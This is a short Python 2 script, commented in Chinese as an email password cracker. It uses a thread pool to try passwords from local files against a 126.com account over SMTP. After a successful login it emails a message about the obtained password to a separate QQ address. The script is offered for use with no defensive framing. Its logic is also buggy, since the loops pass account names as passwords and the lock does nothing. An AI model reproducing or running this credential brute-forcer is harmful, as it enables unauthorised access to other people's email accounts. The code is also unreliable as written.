#coding=utf-8
'''
破解郵箱密碼功能
'''

import threading
import smtplib
import Queue
from email.mime.text import MIMEText

'''
模塊分析：

1.pass是一個文件
2.郵箱名稱spiche
3.多線成的實現 threadpool

'''
#zhubokue

msg=MIMEText('这个是获得的密码信息')
msg['From']='fengchubojue@126.com'
msg['To']='1064187559@qq.com'
msg['Subect']='mima'

print msg.as_string()

class threadpool(object):
    def __init__(self,Max_num=100):
        self.queue=Queue.Queue(Max_num)
        for i in range(Max_num):
            self.queue.put(threading.Thread)

    def get_thread(self):
        return  self.queue.get()

    def add_thread(self):
        self.queue.put(threading.Thread)

#email liebiao
def getemaillist():
    email_name=[]
    with open('1.txt') as file_handel:
        for readline in file_handel.readlines():
            readline=readline.strip('\n')
            email_name.append(readline)
        return email_name

def getpass(passwd):
    a = threading.Lock()
    s=smtplib.SMTP('smtp.126.com')
    a.acquire()
    try:
        s.login('fengchubojue@126.com',passwd)
    except smtplib.SMTPAuthenticationError:
        print 'password incorrect'
    else:
        s.sendmail('fengchubojue@126.com','1064187559@qq.com',msg.as_string())
    finally:
        thread.add_thread()
        s.close()
        a.release()


thread=threadpool(5)
def pass_auth():

    readfile=open('2.txt','r')
    name_list=getemaillist()
    for i in readfile:
        i=i.strip('\n')
        for i in name_list:
            thread1=thread.get_thread()
            t=thread1(target=getpass,args=(i,))
            t.start()

if __name__=="__main__":


    pass_auth()





